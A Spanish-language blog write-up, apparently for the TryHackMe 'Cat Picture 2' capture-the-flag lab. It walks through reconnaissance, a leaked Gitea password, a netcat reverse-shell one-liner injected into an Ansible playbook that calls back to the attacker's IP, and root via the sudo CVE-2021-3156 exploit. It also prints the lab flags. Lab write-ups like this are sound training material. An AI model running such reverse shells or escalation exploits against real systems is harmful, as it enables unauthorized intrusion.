---
title: Cat Picture 2
layout: post
image: 
    path: /assets/covers/tryhackme.png
autor: AreiaNight
tags: [catpicture2, writeup, tryhackme]
category: Pentesting
---

Vale, el día de hoy vamos a hacer la máquina Cat Picture 2, porque no sabía que existía la primera. Como sea, algo me dice que esto va a tener que ver con mensajes ocultos en imágenes y eso me emociona de cierta forma. Antes de nada, como siempre, empezamos con nuestro nmap de toda la vida para ver si hay puertos abiertos. 

Hay varios puertos abiertos, por ahora los que más me interesan como siempre son el 80 que por alguna razón tenemos dos, el 8080 y el 22. En el mismo nmap mostró algo interesante al momento de mandar los scripts básicos de reconocimiento y es que existe un directorio al que se puede acceder llamado /.git lo que quiere decir que hay un repositorio por ahí y quizá es dónde tenga que empezar. Una vez el plan listo, decidí ir a mi navegador para explorar más aquel directorio y... está forbbiden. Como sea, también se encontró un robots.txt así que al menos ahí si pude ingresar en dónde pude recopilar información interesante. 

![](/assets/post/Cat/1.png)

Mientras hacía eso, decidí entrar a la main page y pues no es nada muy elaborado, una simple página con gatitos. Sin embargo en la misma página nos dice con que está hosteada, con un servicio llamado Lychee 3.1 y también Nginx. Mientras exploraba los puertos encontré una sección que parecía ser un dashboard llamado OliveTin. Para mi suerte, tenía un enlace en la descripción justo a la documentación y ahí pude averiguar que es una simple aplicación para volver "fácil" la ejecución de comandos... ¡Ejecución de comandos! Podría ser una posible ruta de entrada. En este dashboard vi que podíamos hacer un pin y recordé que cuando hice una máquina de vulhub hace tiempo por ahí se podía mandar un comando para una shell.

PERO antes de hacer todo eso, vamos paso a paso. La máquina se llama Cat Picture 2, por ende (y a menos que no sea como al máquina de tr0ll), supongo que algo deben tener las fotos de los gatos. Así que bajé todas las imágenes y no les cambié el nombre en caso de que sea necesario para futuro o que ésta misma sea la posible frase para sacar información. Para analizar los metadatos tenemos varias herramientas, pero en este caso usaré exiftool que por cierto, para arch por alguna razón solo lo puedes correr como usuario sin privilegios. Después de sacar toda la información de las imágenes, en la última, algo me llamó la atención. Parece ser un directorio en el puerto 8080, por lo que no sería mala idea irse por ahí. 

![](/assets/post/Cat/2.png)

Una vez en dicho directorio, lo que nos recibe es un simple txt con información de lo más interesante. Entre los puertos hay uno muy especifico que te lleva a un servicio de git tea, al inicio de todo esto decidí registrarme para ver si encontraba algo interesante por ahí y solamente había una cosa, un usuario llamado samarium y ya. En este pequeño documento en txt no solo estaba el nombre de dicho usuario de nuevo, sino también la contraseña de éste junto con información del servicio de OliveTin que ya había mencionado anteriormente. 

```
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```

![](/assets/post/Cat/3.png)

Una vez adentro tenemos nuestra primera flag que puede ser encontrada en el repositorio de éste mismo usuario. Al parecer tiene dicho repositorio privado, lo que explicaría porque no encontré nada interesante en mi primera exploración por el git.

>! Flag: 10d916eaea54bb5ebe36b59538146bb5

Con acceso al git del usuario, podemos ver que su único repositorio tiene el nombre de ansible, el nombre se me hizo familiar así que al regresar al olivetin, vi que es el mismo script que se ejecuta. Con esto en mente, supuse que podría editar el script que se corre simplemente modificando el script base para que se agregue una línea en dónde me pueda mandar una shell a mi equipo. Con el plan listo, fue tiempo de empezar a ejecutarlo. Primero leí un poco la documentación del olivetin para saber cómo modificar el file yml, con la información lista el código que decidí agregar fue este: 

```
shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.1.187 5500 >/tmp/f
```

Y con eso, tenemos acceso remoto a la máquina que queremos comprometer, además de tener la segunda flag:

>! Flag: 5e2cafbbf180351702651c09cd797920

![](/assets/post/Cat/4.png)

Con esto listo, solo nos falta una última flag, así que vamos a empezar a hacer pruebas y demás cositas para poder tener privilegios de root que es dónde supongo estará la siguiente flag. Mientras exploraba que sistema era, descubrí que el sudo es vulnerable, así que quizá pueda escalar por ahí. Antes que nada, necesito la contraseña de bismuth, pero después de explorar un buen rato no encontré nada relacionado que nos pueda dar una pista, decidí simplemente cambiar la contraseña. Algo que tiene linux es que no te pide que metas tu "anterior contraseña" así que con eso listo ya tenemos pleno acceso a la cuenta y, sobre todo, a usar el sudo con éste.  Ahora sí, tiempo de ver si el sudo es vulnerable a esta [[https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435|vulnerabilidad]]. 

![](/assets/post/Cat/5.png)

Una vez confirmado que, en efecto, el sudo es vulnerable, es tiempo de la escalada de privilegios. Para eso voy a recurrir a este [[https://github.com/blasty/CVE-2021-3156|exploit]] para automatizar todo. Corremos el script con un simple make para compilarlo, ejecutamos seleccionando nuestra versión de sudo vulnerable y listo, tenemos acceso a root. Ahora, solo debemos irnos al directorio /root y tendremos la flag.

>! Flag: 6d2a9f8f8174e86e27d565087a28a971

![](/assets/post/Cat/6.png)